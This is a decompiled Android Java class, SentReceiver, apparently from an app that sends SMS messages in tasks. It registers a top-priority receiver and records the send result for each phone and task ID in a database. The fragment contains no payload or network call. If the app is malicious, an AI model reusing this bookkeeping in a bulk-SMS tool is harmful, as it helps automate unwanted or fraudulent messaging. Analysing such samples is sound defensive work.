// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.admv3.listener;

import android.app.PendingIntent;
import android.content.*;
import com.admv2.db.DBSent;

public class SentReceiver extends BroadcastReceiver
{

    public SentReceiver()
    {
    }

    private void AddSent(Context context, int i, int j, int k, int l)
    {
        (new DBSent(context)).addsent(j, k, l);
    }

    public PendingIntent GetPendingIntent(Context context, int i, int j)
    {
        Intent intent = new Intent("com.newage.thz.send");
        intent.putExtra("task_id", j);
        intent.putExtra("phone_id", i);
        reqcode = 1 + reqcode;
        return PendingIntent.getBroadcast(context, reqcode, intent, 0x8000000);
    }

    public void onReceive(Context context, Intent intent)
    {
        if(intent.getAction().equals("com.newage.thz.send"))
        {
            int i = getResultCode();
            AddSent(context, 0, intent.getIntExtra("phone_id", 0), i, intent.getIntExtra("task_id", 0));
        }
    }

    public void register(Context context)
    {
        filter = new IntentFilter();
        filter.addAction("com.newage.thz.send");
        filter.setPriority(0x7fffffff);
        context.registerReceiver(this, filter);
    }

    public void unregister(Context context)
    {
        context.unregisterReceiver(this);
    }

    public static final String ACTION_SMS_SEND = "com.newage.thz.send";
    public static final String EXTRA_PHONE_ID = "phone_id";
    public static final String EXTRA_TASK_ID = "task_id";
    private static int reqcode = 0;
    private IntentFilter filter;

}
